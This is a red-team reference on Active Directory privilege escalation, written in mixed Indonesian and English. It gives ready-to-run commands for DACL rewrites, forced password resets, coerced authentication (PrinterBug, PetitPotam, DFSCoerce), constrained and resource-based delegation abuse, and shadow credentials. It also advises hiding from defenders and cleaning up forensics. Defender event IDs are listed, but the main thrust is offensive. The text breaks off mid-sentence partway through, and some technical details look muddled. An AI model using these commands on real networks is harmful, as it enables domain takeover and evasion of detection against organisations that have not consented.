# ad-acl-deleg — ad

# AD ACL Abuse & Delegation — Red Team Reference

## 1. Model Mental: Kenapa ACL Abuse Menang

Every AD object has an `nTSecurityDescriptor`. The `AccessControlList` contains ACEs that reference a SID + `AccessMask`. What we're after are ACEs that grant privileged control to a SID we can own/pivot.

Key controls (from weak → strong):

| Right | Mask | Efek langsung |
|---|---|---|
| `GenericWrite` | `0x40000000` | Tulis atribut non-sensitif → `servicePrincipalName`, `msDS-KeyCredentialLink`, `logonHours` |
| `GenericAll` | `0xF01FF` (object) | Full control of that object |
| `WriteDACL` | `0x40000` | Rewrite the DACL → add `GenericAll` for yourself |
| `WriteOwner` | `0x80000` | Take ownership → then write the DACL |
| `ForceChangePassword` | `0x00200000` (extended `00299570-…)` | Reset `unicodePwd` without knowing the old password |
| `AddKeyCredentialLink` | `0x00000220` (extended `5b47d60f-…`) | Shadow credentials |
| `DS-Replication-Get-Changes-All` | `0x00000100` (ext) | DCSync |

The end goal is usually one of: **DCSync**, **Shadow Credentials → PKINIT TGT**, **RBCD → S4U2Proxy**, **Unconstrained → coerced auth → TGT capture**.

---

## 2. Path Enumeration with BloodHound (CE)

Modern collectors (SharpHound 2.x / `bloodhound-python` 1.7+ / RustHound) use `LDAP` + `SAMR`/`NetWksta` for sessions; **ACLs are pulled from `nTSecurityDescriptor` via LDAP with the `LDAP_SERVER_SD_FLAGS_OID` control (1.2.840.113556.1.4.801) `OWNER|DACL`**. Defenders can see LDAP searches with that control + the `(objectClass=*)` filter sweeping the `configuration`/`domain` NC.

```bash
# SharpHound (Windows, dari host yang sudah domain-joined banyak trik opsional)
SharpHound.exe -c All,GPOLocalGroup --LDAPPort 389 --ZipFilename bh.zip --RandomizeFilenames --ExcludeDCs false

# bloodhound-python (Linux)
bloodhound-python -u svc_low -p 'Passw0rd!' -d CORP.LOCAL -ns 10.0.0.10 \
  -c All --zip -op ./out.zip
```

Key Cypher queries (run in the "Raw Query" panel):

```cypher
// 1) Siapa pun yang punya GenericAll/WriteDACL/WriteOwner/GenericWrite ke Tier-0
MATCH p=(n)-[r:GenericAll|WriteDacl|WriteOwner|GenericWrite|ForceChangePassword|AddKeyCredentialLink|Owns]->(t)
WHERE t.tier0 = true OR t.highvalue = true
RETURN p LIMIT 500;

// 2) Jalur ACL menuju Domain Admins dari user yang kita kontrol
MATCH p=shortestPath((n {name:'SVC_LOW@CORP.LOCAL'})-[r:MemberOf|GenericAll|WriteDacl|WriteOwner|GenericWrite|ForceChangePassword|AddKeyCredentialLink|Owns|Contains|GpLink*1..8]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}))
RETURN p;

// 3) Shortest path dari user ke DA (campur ACL+Kerberos)
MATCH p=shortestPath((n {name:'SVC_LOW@CORP.LOCAL'})-[*1..10]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}))
RETURN p;

// 4) Unconstrained delegation di host (bukan DC) yang masih hidup
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name CONTAINS 'DC'
RETURN c.name, c.operatingsystem, c.lastlogon;

// 5) Siapa yang bisa RBCD ke target (GenericAll/WriteDacl di komputer, atau AllowedToAct)
MATCH p=(u)-[:GenericAll|WriteDacl|Owns|AllowedToAct]->(c:Computer)
RETURN p LIMIT 500;
```

BloodHound CE 6.x/7.x adds the **`ADCSESC1..ESC13`** edges — if the target has a CRL/Template misconfig, ACL + ADCS is one of the fastest paths.

**BloodHound defender artifacts:** event 4662 with `Properties = {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} / {19195a5b-6da0-11d0-afd3-00c04fd930c9}` (replication) from a non-DC account; it's not uncommon for the count of 4662 from a single account to spike. SharpHound also leaves zip filenames `*_BloodHound.zip` / `*_2024…zip` in `%TEMP%` (if not `--RandomizeFilenames`), and writes **event 4688** for `SharpHound.exe` (process creation auditing must be on). Back-to-back LDAP queries to `msDS-KeyCredentialLink`/`msDS-AllowedToActOnBehalfOfOtherIdentity` from a single workstation are also a signal.

---

## 3. GenericAll / WriteDACL / GenericWrite / ForceChangePassword — Eksekusi

### 3.1 PowerView (PowerSploit 3.0 / fork modern, .NET 4.x)

```powershell
Import-Module .\PowerView.ps1

# Lihat ACL yang relevan ke target
Get-DomainObjectAcl -Identity 'CN=svc_target,CN=Users,DC=corp,DC=local' -ResolveGUIDs |
  ? { $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner|GenericWrite|ExtendedRight' } |
  fl ObjectDN,AceQualifier,ActiveDirectoryRights,SecurityIdentifier,ObjectAceType

# ForceChangePassword tanpa tahu password lama
Set-DomainUserPassword -Identity svc_target -AccountPassword (ConvertTo-SecureString 'P@ssw0rd2024!' -AsPlainText -Force) -Verbose

# GenericAll/WriteDACL ke grup → tambah diri sendiri
Add-DomainGroupMember -Identity 'IT Admin' -Members 'svc_low' -Verbose

# WriteDACL → beri diri sendiri GenericAll dulu
Add-DomainObjectAcl -TargetIdentity svc_target -PrincipalIdentity svc_low -Rights All -Verbose

# GenericWrite ke user → set SPN (targeting Kerberoast)
Set-DomainObject -Identity victim_user -Set @{serviceprincipalname='http/fake'} -Verbose
# … lalu Request-SPNTicket / Rubeus kerberoast

# GenericWrite ke computer → RBCD
Set-DomainObject -Identity 'WS01$' -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'='…'}  # biasanya via Rubeus
```

**What gets sent:** an LDAP `ModifyRequest` to the DC. `ForceChangePassword` = extended control `00299570-246d-11d0-a768-00aa006e0529` with `userAccountControl` unchanged → `unicodePwd` replaced. `Add-DomainGroupMember` = `Add` on the `member` attribute. `Add-DomainObjectAcl` = `ModifyRequest` with `REPLACE` on `nTSecurityDescriptor` (the `LDAP_SERVER_SD_FLAGS_OID` control).

**Why it fails:**
- In domains **Windows Server 2016+ with `Default Domain Policy` set to `Reversible Encryption = Disabled`** and **`AdminSDHolder`** protecting admins (Owner stays `Domain Admins` → the ACE you add to an admin object is *stamped* back every 60 minutes by `SDProp`; default `HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters\AdminSDHolder Protect` interval **60 minutes**). If the target is a member of `Domain Admins`/`Account Operators`/`Server Operators` — `SDProp` will remove your ACL **within ≤60 minutes**, so execution must be instant after escalating.
- Forensics: 4662 with `SubjectUserSid` = your account, `ObjectType` = extended right GUID, from a single workstation → very noisy.

### 3.2 StandIn (v1.0.25 — .NET Framework)

```powershell
# GenericAll / WriteDACL → tambah diri sebagai member grup
StandIn.exe --group "IT Admin" --add svc_low

# GenericAll ke user → reset password
StandIn.exe --user svc_target --pass ResetP@ss!2024

# WriteOwner → ambil owner lalu WriteDACL
StandIn.exe --object "CN=Target,CN=Users,DC=corp,DC=local" --owner svc_low
# (lalu gunakan PowerView/dacledit untuk Add-DomainObjectAcl)

# ForceChangePassword tanpa trik password history
StandIn.exe --user svc_target --admincount 0 --pass NewP@ss!
```

StandIn 1.0.25 focuses on **owner → DACL → reset**, compatible with PowerShell 5.1 + .NET 4.7.2. Run it **from a user session that has the right**, not from the domain controller host (the target 4662 event will still appear on the DC).

### 3.3 dacledit.py (impacket 0.11.0+)

```bash
# Lihat DACL
python3 dacledit.py -action read -target 'CN=Target,CN=Users,DC=corp,DC=local' \
  -principal svc_low -dc-ip 10.0.0.10 corp.local/svc_low:'Passw0rd!'

# Backdoor: tambah GenericAll untuk diri sendiri
python3 dacledit.py -action write -rights FullControl \
  -target 'CN=Target,CN=Users,DC=corp,DC=local' \
  -principal svc_low -dc-ip 10.0.0.10 corp.local/svc_low:'Passw0rd!'

# WriteDACL saja (lebih senyap — defender jarang alert pada DACL modified selain high-value)
python3 dacledit.py -action write -rights WriteDacl -target ... -principal svc_low ...

# Restore DACL (cleanup forensik)
python3 dacledit.py -action restore -file dacl.bak -target ... -principal svc_low ...
```

dacledit.py writes `nTSecurityDescriptor` via LDAP `ModifyRequest` with the `LDAP_SERVER_SD_FLAGS_OID` flag `DACL_SECURITY_INFORMATION`. Always back up first (`-action backup -file dacl.bak`) so you can restore — important for long-running operations.

**Artefak defender gabungan (PowerView/StandIn/dacledit):**
- **4662** on the DC: `Properties` = `00000000-0000-0000-0000-000000000000` for a DACL write, or the extended right GUID; `AccessMask 0x100` (control access). Source = attacker account.
- **Event 4738** (user changed) during `ForceChangePassword` — including `Password Last Set` changing without a 4624/4648 logon around it.
- **Event 4720/4728/4732/4756**: user/group created, member added. Specifically for `ForceChangePassword`, `userAccountControl` doesn't change but `pwdLastSet` = a new timestamp; correlate the anomaly if the target doesn't log in afterwards.
- **Event 5136** (Windows Server 2008+ audit DS changes, if `Directory Service Changes` audit = Success): the `nTSecurityDescriptor` attribute changed, the new value is recorded. This is the **primary signal** for dacledit/PowerView WriteDACL. Default audit policy often disables **Directory Service Changes**, so defenders must enable it first — red teams can *abuse this gap*.
- Sysmon **EventID 1** for `StandIn.exe`, `SharpHound.exe`, `Rubeus.exe`, `powershell.exe -enc` with the arguments `-AddAccessRule`, `Add-DomainObjectAcl`, `Set-DomainObject`.

---

## 4. Unconstrained Delegation — Discovery + Abuse (PrinterBug)

### 4.1 Discovery

```powershell
# PowerView
Get-DomainComputer -Unconstrained | select name,operatingsystem,lastlogonTimestamp

# AD module
Get-ADComputer -Filter {TrustedForUnDelegation -eq $true} -Properties TrustedForUnDelegation |
  select Name,OperatingSystem,LastLogonDate

# impacket
python3 findDelegation.py corp.local/svc_low:'Passw0rd!' -dc-ip 10.0.0.10 -target-domain corp.local
```

By default `TRUSTED_FOR_DELEGATION` (`userAccountControl` bit `0x80000`) is enabled on **DCs** (unless disabled) and on hosts explicitly *unconstrained*. Interesting candidates: servers running the **print spooler**, **IIS app pool**, **SQL Server**, and **admin jump hosts** — because admins often log on there (TGT in LSASS memory).

```bash
# PrinterBug via SpoolSample (Windows) — forced auth DC → host unconstrained
.\SpoolSample.exe DC01.corp.local ATTACKER-UNC.corp.local

# Via Rubeus (coerce + capture dalam satu window)
.\Rubeus.exe monitor /interval:5 /nowrap
.\SpoolSample.exe DC01.corp.local ATTACKER-UNC.corp.local
# Tangkap TGT DC01$ dari service ticket dalam Rubeus
.\Rubeus.exe ptt /ticket:<base64>
```

Coercion alternatives: **PetitPotam** (`\\.\pipe\lsarpc` EFSRPC), **DFSCoerce**, **ShadowCoerce** — Spooler has been partially patched on Server 2019+ (KB5005010 + Spooler disabled by default in many WS2022 deployments), so **prioritize DFSCoerce / PetitPotam against hosts that still have active coercion** in a mixed fleet.

```bash
# impacket 0.11 — tetapi impacket tidak punya coerción native; pakai tools eksternal
python3 printerbug.py corp.local/svc_low:'Passw0rd!'@10.0.0.10 10.0.0.50   # SpoolSample
python3 dfscoerce.py -u svc_low -p 'Passw0rd!' -d corp.local 10.0.0.50 10.0.0.10
python3 PetitPotam.py -u svc_low -p 'Passw0rd!' 10.0.0.50 10.0.0.10
```

**What gets sent:** MS-RPRN `RpcRemoteFindFirstPrinterChangeNotificationEx` (SPOOLSS) → the DC opens SMB to `\\HOST\share` as the **machine account DC$**. Or MS-EFSRPC `EfsRpcOpenFileRaw` on `\PIPE\lsarpc` → same, coerced auth. The auth that arrives = a TGT (Kerberos) that can be captured at the listener if the host is unconstrained (LSASS will store the DC$ TGT → extracted via Rubeus/mimikatz `sekurlsa::tickets`/`dpapi`).

**Why it works:** an unconstrained target stores anyone's TGT that authenticates; **DC$ TGT = DCSync-ready**. **Why it fails:**
- Spooler Service disabled on DC (default in Server 2022 22H2+ via `DisableSpooler` GPO) → coercion via printer fails. Check `Get-Service Spooler -ComputerName DC01` first.
- `Restrict Delegation` / **KB4598347+** + `DisableLoopbackCheck`/SMB signing: if SMB signing is **mandatory** on the target and the attacker cannot sign, the redirected TGT capture still works (the captured auth is not relay, so SMB signing does not block).
- **Windows 11 24H2 / Server 2025** tightens `krbtgt` and `Protected Users` — TGT is still reversible for machine accounts unless under **Credential Guard + LSASS PPL** and `Rubeus` needs a **handle via `kekeo`/`PPLdump`**; modern defence = **Credential Guard default ON in Win11 Enterprise 24H2** → `sekurlsa` fails, must use `tickets` extraction from LSA that still leaks on hosts that do **not** enable CG.
- **Event 4768** (TGT request) for `DC01$` from attacker IP → highly suspicious because DCs rarely request TGTs from workstations.

**Defender artifacts:** **4624 logon type 3** for `DC01$` to attacker host — the clearest sign; 4768 TGT request `DC01$` from non-DC IP; **5145** SMB share access for `\\ATTACKER\share` from `DC01$`; spooler/EFSRPC RPC call visible if RPC auditing is on (4648 + 5156 with `FilterRTID`).

---

## 5. Constrained Delegation — S4U2Self / S4U2Proxy

### 5.1 Discovery

```powershell
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto,useraccountcontrol
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
```

Key attributes:
- `userAccountControl` bit `0x1000000` (**TRUSTED_TO_AUTH_FOR_DELEGATION**) — "protocol transition", memungkinkan **S4U2Self**.
- `msDS-AllowedToDelegateTo` — list of SPNs that may be *proxied* via S4U2Proxy. Without this entry, constrained delegation = empty row.

Dua mode:
- **With protocol transition** (`TrustedToAuthForDelegation=true`): S4U2Self produces a forwardable service ticket to itself as the victim → then S4U2Proxy to the SPN in `AllowedToDelegateTo`.
- **Without protocol transition**: S4U2Self only produces a *non-forwardable* ticket; **cannot** proceed to S4U2Proxy. So what can be abused = constrained delegation that **does** have protocol transition.

### 5.2 Eksekusi (Rubeus 2.x)

```powershell
# a) Dapatkan TGT untuk akun yang punya constrained delegation (mis. svc_web$ / svc_low)
.\Rubeus.exe asktgt /user:svc_web /password:'Passw0rd!' /domain:corp.local /dc:DC01.corp.local /ptt

# b) S4U2Self — minta tiket ke diri sendiri sebagai administrator (impersonate)
.\Rubeus.exe s4u /self /user:svc_web /impersonateuser:Administrator \
  /msdsspn:CIFS/FS01.corp.local /dc:DC01.corp.local /ptt

# c) S4U2Proxy — tiket final untuk SPN target
.\Rubeus.exe s4u /ticket:<base64 TGT dari langkah a> /impersonateuser:Administrator \
  /msdsspn:CIFS/FS01.corp.local /dc:DC01.corp.local /ptt

# d) Jika msDS-AllowedToDelegateTo hanya berisi SPN satu servis, "bermain" dengan
#    alternate SPN: minta tiket ke host lain dengan me-replace service class
.\Rubeus.exe s4u /ticket:<TGT> /impersonateuser:Administrator \
  /msdsspn:HTTP/APP01.corp.local /altservice:CIFS /ptt
# altservice trik: tiket yang di-issue ke HTTP/APP01 bisa dipakai untuk CIFS/APP01 karena
# PAC sama, hanya nama servis di tiket diubah. Ini mem-bypass AllowedToDelegateTo.
```

**What is sent:**
1. `TGS-REQ` with `PA-FOR-USER` (`S4U2Self`) — `cname = Administrator`, `sname = svc_web` → DC returns a ticket for `svc_web` with the name `Administrator` (forwardable because of protocol transition).
2. `TGS-REQ` with `PA-FOR-USER` + `additional-tickets` containing the S4U2Self ticket → DC issues a ticket for `CIFS/FS01`.

**Why it works:** `TrustedToAuthForDelegation` + `AllowedToDelegateTo` is a very loose trust boundary — every SPN in that list = full impersonation.

**Why it fails:**
- **Event 4741/5136** if `msDS-AllowedToDelegateTo` is changed — but if already configured, the abuse is *silent* on the ACL change side.
- **Protected Users / `Sensitive Account`, `Account is sensitive and cannot be delegated`** → S4U2Self returns **`KDC_ERR_CLIENT_REVOKED`** or `KDC_ERR_BADOPTION` for the victim account. **Check `userAccountControl` 0x100000** (`NOT_DELEGATED`) first before trying; DA users in a protected domain cannot be impersonated.
- **Windows Server 2019+ / Win11 22H2+** tightens computers with **`Protected Users` in the group**, and `AllowDelegation` default deny for DA accounts at forest level (via `Delegation` in `UserAccountControl`).
- Event **4769** with `Service Name` = `svc_web$` + `Transited Services` = target + from an impersonating account → highly suspicious if not normal.

**Artefak defender:**
- **4769** TGS request for `svc_web$` from `administrator` account with `Ticket Options = 0x40810000` (forwardable + renewable) — XML in `EventData` shows `TransitedServices`.
- **4769** second time with `Service Name = CIFS/FS01` and `User = Administrator` (the final ticket used).
- **4624 logon type 3** on FS01 for `Administrator` with no other interactive logon at the same hour → "ghost logon".

---

## 6. Resource-Based Constrained Delegation (RBCD)

### 6.1 Requirements

- Attacker has `GenericAll`/`WriteDacl`/`Owns`/`AllowedToAct` on the **target computer** (`msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer object). Or the target has no SPN, admin can write the attribute.
- Domain functional **Windows Server 2012** minimum for this feature.
- Attacker controls **one principal that has an SPN** — can be a new user with a `servicePrincipalName` we set (if `MachineAccountQuota > 0` or admin can create a user with an SPN).

### 6.2 Eksekusi

```powershell
# 1) Cek MachineAccountQuota (default 10, domain baseline 0 di lingkungan keras)
Get-DomainObject -Identity 'DC=corp,DC=local' -Properties ms-DS-MachineAccountQuota |
  select ms-ds-machineaccountquota

# 2) Buat machine account baru (jika quota > 0)
.\StandIn.exe --computer 'EVIL$' --make
# atau
python3 addcomputer.py -method SAMR -dc-ip 10.0.0.10 corp.local/svc_low:'Passw0rd!'  \
  -computer-name EVIL -computer-pass 'EvilP@ss2024!'

# 3) Dapatkan TGT EVIL$ (dan service ticket ke diri sendiri)
.\Rubeus.exe asktgt /user:EVIL$ /password:'EvilP@ss2024!' /domain:corp.local /dc:DC01.corp.local /ptt

# 4) Overwrite msDS-AllowedToActOnBehalfOfOtherIdentity TARGET → EVIL$
#    Ini harus dijalankan oleh attacker yang punya GenericAll ke TARGET
Set-ADComputer -Identity 'TARGET$' -PrincipalsAllowedToDelegateToAccount 'EVIL$'
# atau via PowerView
Set-DomainObject -Identity 'TARGET$' -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'='O:BAD:...'}
# atau via Rubeus versi baru (2.0+)
.\Rubeus.exe rbcd /target:TARGET$ /sid:S-1-5-21-...-1105  /dpipe /dc:DC01.corp.local /force
```

```bash
# Impacket alternative — getST (0.11.0)
python3 getST.py -spn 'CIFS/TARGET.corp.local' -impersonate Administrator \
  -dc-ip 10.0.0.10 corp.local/'EVIL$':'EvilP@ss2024!'
# generates Administrator@CIFS_TARGET.ccache

export KRB5CCNAME=Administrator@CIFS_TARGET.corp.local.ccache
python3 smbclient.py -k -no-pass TARGET.corp.local
```

**What is sent:**
- `addcomputer` via SAMR (`SamrCreateUser2InDomain`) / LDAP `Add` for `sAMAccountName = EVIL$` + `dNSHostName` + `servicePrincipalName`.
- `Set-ADComputer` = LDAP `ModifyRequest` with `Replace` on `msDS-AllowedToActOnBehalfOfOtherIdentity` — binary SD value with one ACE: `(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<EVIL_SID>)`.
- `getST.py` = two TGS-REQs (S4U2Self to EVIL$ itself as Administrator, S4U2Proxy to CIFS/TARGET).

**Why it works:** RBCD allows the **TARGET** to trust **EVIL$** to delegate; no protocol transition needed and the target SPN does not need to be in AllowedToDelegateTo. Commonly forgotten check: **`AddKeyCredentialLink`** also often appears — if the target has PKINIT, shadow credentials = a stealthier path (see §7). **RBCD vs Shadow Credentials**: RBCD requires the target computer to be writable + SPN access; Shadow Cred is less visible because it does not touch `msDS-AllowedToActOnBehalfOfOtherIdentity` (an event defenders know).

**Why it fails:**
- **`MachineAccountQuota = 0`** in modern baseline OU/domain (Microsoft Secure Score recommends 0) → cannot create EVIL$. Alternative binding: use an **existing user account** that has an SPN and that you can control (e.g. a service account with an SPN).
- **Target = DC** and **`ms-DS-MachineAccountQuota`=0** with **`msDS-AllowedToActOnBehalfOfOtherIdentity`** protected by `SDProp`? DC is not an AdminSDHolder target, so RBCD to a DC **is possible** — this is one of the favorite paths, and defenders must audit `5136` on `msDS-AllowedToActOnBehalfOfOtherIdentity` for **all** computers.
- **`S4U2Proxy` to a defensive target**: happens when `msDS-AllowedToActOnBehalfOfOtherIdentity` is *cleared* (defender cleanup) before the attacker runs `getST` → the final ticket is rejected with `KDC_ERR_BADOPTION`. Response: after setting the attribute, run `getST` within one minute.
- **`Protected Users`** on the Administrator account being impersonated (e.g. if target = DC and Administrator = Protected) → `KDC_ERR_CLIENT_REVOKED`. **Use `-impersonate` with an account that is NOT a DA**, or `-additional-ticket` that has already been collected.

**Artefak defender RBCD:**
- **5136** on `msDS-AllowedToActOnBehalfOfOtherIdentity` on the `TARGET$` object (audit `Directory Service Changes`), the `LDAPDisplayName` value shows EVIL$'s SID. This is **the only primary signal** — do not skip.
- **4662** on the TARGET for that attribute.
- **4741** (computer account created) bila `addcomputer` sukses; **4720** (user created) jika fallback.
- **4769** on the TARGET for `EVIL$` with `TransitedServices=Administrator` + `Service Name=CIFS/TARGET` from the attacker IP → correlation with `5136` = full attack chain.

---

## 7. Shadow Credentials — Alternatif Senyap

If you have `GenericWrite`/`GenericAll` on a user/computer with a writable **`msDS-KeyCredentialLink`** (requires `Windows Server 2016` + `PKINIT`):

```bash
# Whisker (C#) atau pyWhisker (Python) — 1.0+
python3 pywhisker.py -d corp.local -u svc_low -p 'Passw0rd!' --target TARGET$ --action add
# Output: .pfx + base64 DeviceID

# Minta TGT via PKINIT dengan cert
python3 gettgtpkinit.py -cert-pfx TARGET.pfx -pfx-pass '' corp.local/TARGET$ TARGET.ccache
export KRB5CCNAME=TARGET.ccache
python3 getnthash.py -key <AS-REP key> corp.local/TARGET$
```

**Artifacts:** 5136 on `msDS-KeyCredentialLink` (DS Changes audit); 4768 PKINIT TGT for the target from the attacker IP with `PreAuthType` `16` (FK). Often not covered by default detection — prioritize detecting this attribute.

---

## 8. Operational Pitfalls (Field Reality)

1. **`SDProp`**: Default interval is 60 minutes, and `SDProp` events do not appear in logs. If the target = AdminSDHolder-protected, do DACL write → escalate → cleanup within **< 60 minutes**, or target a **non-protected** object (service account user in a normal OU).
2. **`Directory Service Changes` audit is off by default**. Many defenders don't know that `nTSecurityDescriptor` changes occur. But this is a double-edged sword: **you also don't know whether the defender sees 5136 because they may have just enabled it**. Safe assumption: audit is on.
3. **Kerberos ticket lifetime default = 10 hours** (TGT) and **service ticket = follows the TGT**. Tickets are not invalidated after a password reset — **resetting the account's password = does not kill already-printed tickets**. For a long kill chain, print tickets **last**, don't reset the victim's password first (triggers 4724/4738 which may auto-alert). If you must reset, you must **reset `krbtgt` twice** (Golden Ticket mitigation) to burn the attacker's tickets — an expensive defender operation.
4. **`Protected Users` + `Credential Guard`** on Win11 24H2/Server 2025 blocks `sekurlsa` and `S4U2Self` to those accounts. Don't waste time; **look for accounts where explicit `NOT_DELEGATED` = false** first; DA must *not* be Protected for S4U/RBCD.
5. **`spooler` is disabled** on Server 2022 22H2+ DC by default. Switch to **DFSCoerce** (`MS-DFSNM`) or **PetitPotam**; for Windows Server 2019+ you need the EFSRPC method `EfsRpcOpenFileRaw` which is **not** patched if the `Encrypting File System` service is running. **Check that the RPC endpoint map (135) is reachable** and **SMB signing** on the attacker listener.
6. **MachineAccountQuota = 0** in domains hardened via GPO. Fall back to **a user with an SPN** that the attacker controls (old account operator, service account without rotation) — setting `msDS-AllowedToActOnBehalfOfOtherIdentity` still requires a **writable computer**.
7. **`msDS-KeyCredentialLink` requires PKINIT** — if the domain does **not** have a CA/DC 2016+, shadow credentials fail with error `KDC_ERR_PADATA_TYPE_NOSUPP`. First check that the `AD CS` role exists.
8. **Trust boundary**: it is often forgotten that DACL write directly works only on objects **within the same forest**. Cross-forest (trust) requires `SID Filtering` bypass — so **do the DACL work in the domain where you already have an account**, don't go cross-trust.
9. **Cleanup**: dacledit `-action restore` or PowerView `Remove-DomainObjectAcl` **before** the defender turns on Directory Service Changes audit. But 4662 cannot be cleaned up — **this is permanent forensic evidence** in the DC Security log; if the defender has a SIEM with long retention, the account you used for the DACL write **must be burned** after the op.
10. **Tooling upgrades**: StandIn 1.0.25 is already outdated (no native RBCD support — use Rubeus). Rubeus 2.x (`v2.3.2`+) is required for the new `rbcd` action; impacket 0.11.0 has `getST.py` + `addcomputer.py` + `dacledit.py` + `findDelegation.py` — make sure you're not running old impacket (`0.9

## [continued]

## Further References: ACL Abuse, Delegation & BloodHound Cypher (Continued)

### 1. Advanced Cypher — Queries That Are Rare but High-Value

Basic queries (`ShortestPathsToDomainAdmins`, `FindAllPaths`) are usually already covered. Below are advanced queries that are often missed:

```cypher
// 1. Principal dengan hak tulis ke OU yang berisi komputer DC (jalur tidak langsung ke DA)
MATCH p=(u:User)-[:GenericAll|GenericWrite|WriteDACL|Owns*1..]->(o:OU)
WHERE o.distinguishedname =~ '(?i).*Domain Controllers.*'
RETURN p

// 2. Jalur ke Tier-0 tanpa melalui grup yang sudah diketahui "berisik"
MATCH p=shortestPath((u:User {enabled:true})-[:MemberOf|AdminTo|GenericAll|WriteDACL|ForceChangePassword|AddKeyCredentialLink|AllowedToAct|AllowedToDelegate|AddMember|WriteOwner*1..6]->(g:Group))
WHERE g.objectid ENDS WITH '-512' AND NOT ANY(r IN relationships(p) WHERE r.relation = 'MemberOf' AND endNode(r).name = 'Domain Admins')
RETURN p

// 3. Siapa yang bisa mengambil alih akun kerberoastable
MATCH (u:User)-[:GenericAll|GenericWrite|ForceChangePassword|WriteDACL|Owns]->(t:User {hasspn:true})
RETURN u.name, type(last(relationships(...)))  // atau sederhanakan: RETURN u.name, t.name

// 4. Shadow Credentials surface (msDS-KeyCredentialLink)
MATCH p=(n)-[:AddKeyCredentialLink|GenericWrite|GenericAll]->(t)
WHERE t.enabled = true
RETURN p

// 5. WriteDACL ke domain head (domain object sendiri)
MATCH p=(u)-[:WriteDACL|GenericAll|Owns]->(d:Domain)
RETURN p

// 6. Certificate template ESC surface (jika collector certipy/ADCS terpasang)
MATCH p=(u)-[:Enroll|GenericAll|WriteDACL|Owns]->(ct:CertTemplate)
WHERE ct.enrolleesuppliessubject = true OR ct.authenticationenabled = true
RETURN p
```

**Jebakan Cypher:**
- `WriteDACL` in older BloodHound is often reported as `GenericAll` (a derived form). In BloodHound CE (v5+), edges are remodeled—verify with `MATCH ()-[r]->() RETURN type(r), count(*)` before trusting path results.
- The `AddKeyCredentialLink` edge does not appear if the collector is < v4 `SharpHound`; run the latest collector.
- `AllowedToAct` (RBCD) only appears if `msDS-AllowedToActOnBehalfOfOtherIdentity` is set at collection time.
- `CanRDP`/`CanPSRemote` often point to hosts already owned; filter with `NOT endNode(r).owned = true` to focus on new targets.
- BloodHound CE stores `system_tags`; filter `WHERE NOT u.system_tags CONTAINS 'admin_tier_0'` to hide noise.

### 2. Varian Perangkat/Produk & Versi Schema

| Scenario | Tool | Important variant |
|---|---|---|
| GenericAll user | PowerView | `Set-DomainObjectOwner`, `Add-DomainObjectAcl`, `Set-DomainUserPassword -Identity X -AccountPassword (ConvertTo-SecureString ...)` |
| GenericAll user (Linux) | `bloodyAD` | `bloodyAD -u user -p pass -d dom add genericAll 'CN=target,CN=Users,DC=d,DC=l' attacker` (writes ACE, not direct exploit) |
| WriteDACL | `dacledit.py` (Impacket) | `-action write -rights FullControl -principal attacker -target 'CN=...'` |
| WriteDACL | PowerView | `Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -Rights DCSync` (classic path to DCSync) |
| WriteDACL (newer) | `StandIn` (.NET) | `StandIn.exe --object "CN=..." --grant "DOMAIN\attacker" --rights FullControl` — does not require PowerShell logging |
| ForceChangePassword | net.exe / PowerView | `net user victim NewPass /domain`, or `Set-DomainUserPassword` |
| GenericWrite user (logon script) | PowerView | `Set-DomainObject -Identity victim -Set @{scriptpath='\\attacker\s\p.cmd'}` |
| GenericWrite user (SPN) | PowerView | `Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/evil'}` then `Get-DomainSPNTicket` |
| GenericWrite computer (RBCD setup) | PowerView/StandIn | tulis `msDS-AllowedToActOnBehalfOfOtherIdentity` |
| AddKeyCredentialLink | Whisker / pyWhisker | `Whisker.exe add /target:user$ /domain:d.l /dc:dc.d.l` (Windows) ; `pywhisker.py -a add -t user -c <cert>` (Linux) |
| Owns | `Set-DomainObjectOwner` | Take ownership then `Add-DomainObjectAcl` for FullControl |

**Edge case terbaru:**
- **Windows Server 2022 + KB5023xx**: `ms-DS-MachineAccountQuota` is still default 10, but **event 4741** is tightened—some organizations lower it to 0; RBCD via a new computer account fails. Fallback: use a computer account already owned.
- **Windows Server 2025**: `msDS-KeyCredentialLink` write via LDAP triggers **event 5136** with an `attributeValue` blob; modern defenders parse this.
- **`ForceChangePassword` on `userAccountControl` with the `DONT_EXPIRE_PASSWORD` flag**: password reset still succeeds, but the artifact is different (see §6).
- **StandIn vs PowerView**: PowerView loads `System.Management.Automation` → detected by `ScriptBlockLogging`; StandIn (C#) avoids that, but writing directly to LDAP still generates 5136.

### 3. Unconstrained Delegation — Varian & Edge Case

**Advanced discovery (not just `TRUSTED_FOR_DELEGATION`):**

```powershell
# Komputer + user unconstrained
Get-DomainComputer -Unconstrained | Select samaccountname, dnshostname
Get-DomainUser -Unconstrained  | Select samaccountname

# Deteksi "coffee" (TGT di memori) — target printer bug
# Cek Spooler di kandidat target
Get-DomainComputer -Filter '(operatingsystem=*Server*)' | % {
  try { Test-Path "\\$($_.dnshostname)\print$" } catch {}
}
```

**Printer Bug — varian trigger:**

| Trigger | Variant | Notes |
|---|---|---|
| MS-RPRN `RpcRemoteFindFirstPrinterChangeNotificationEx` | `printerbug.py`, `SpoolSample.exe`, `Rubeus.exe monitor` | Most classic |
| MS-EFSRPC (PetitPotam) | `PetitPotam.exe` | For unconstrained delegation, target = unconstrained host, capture DC TGT |
| MS-FSRVP | `dfscoerce.exe` | Server 2019+ |
| DFSCoerce / ShadowCoerce | impacket variant | Many are patched; verify first |
| MS-DFSNM | `dfscoerce` | |

**Setup listener & tangkap TGT:**
```
# Linux
ntlmrelayx.py -t ldap://dc.dom.local --delegate-access --escalate-user attacker$ 
# atau untuk unconstrained: --dump-tgt? (butuh modul capture)
# Windows
Rubeus.exe monitor /interval:5 /nowrap
# Trigger
python3 printerbug.py domain/user:pass@target-unconstrained attacker-ip
```

